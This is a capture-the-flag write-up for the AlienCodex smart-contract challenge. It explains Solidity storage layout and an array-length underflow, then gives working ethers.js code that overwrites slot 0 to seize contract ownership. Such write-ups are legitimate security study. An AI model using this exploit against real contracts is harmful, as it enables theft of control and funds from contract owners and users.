## AlienCodex
To solve this challenge we need to claim ownership of the contract.

Here it is essential to check how the storage is structured. 
Firstly, since we inherit Ownable contract, the contract's storage variables will be laid out first.
It consists of a single 20-byte `owner` address. Then, the AlienCodex contract's `contact` variable will be laid out. 
Since it is a boolean, it will still fit into the same 32-byte storage slot.
Finally, a dynamically-sized bytes32 array is defined.

When we have a dynamic complex type such as a dynamic array, the reserved slot p contains the length of the array as a uint256, and the array data itself is located sequentially at the address keccak256(p).

Here is how the storage will look like:
```js
slot 0: owner, contact
slot 1: codex.length
// ...
slot keccak(1): codex[0]
slot keccak(1) + 1: codex[1]
slot keccak(1) + 2: codex[2]
slot keccak(1) + 3: codex[3]
// ...
```

Note that the array items wrap around after they reached the max storage slot of 2^256 - 1. Using a bit of math we can find the codex index that writes to the owner variable at storage slot 0. However, this bug won't be valid in solidity newer versions.

```js
need to find array index that maps to 0 mod 2^256
i.e., keccak(1) + index mod 2^256 = 0
<=> index = -keccak(1) mod 2^256
<=> index = 2^256 - keccak(1) as keccak(1) is in range
```

So, now using ethers.js we can:
```js
tx = await contract.make_contact();
await tx.wait();

// all of contract storage is a 32 bytes key to 32 bytes value mapping
// first make codex expand its size to cover all of this storage
// by calling retract making it overflow
tx = await contract.retract();
await tx.wait();

// now try to index the map in a way such that we write to the owner variable at slot 0
// codex[0] value is stored at keccak(codexSlot) = keccak(1)
// codexSlot = 1 because slot 0 contains both 20 byte address (owner) & boolean
// needs to be padded to a 256 bit
const codexBegin = BigNumber.from(
    ethers.utils.keccak256(
        `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
);
const ownerOffset = BigNumber.from(`2`).pow(`256`).sub(codexBegin);

const eoaAddress = await eoa.getAddress()
tx = await contract.revise(ownerOffset, ethers.utils.zeroPad(eoaAddress, 32));
await tx.wait();
```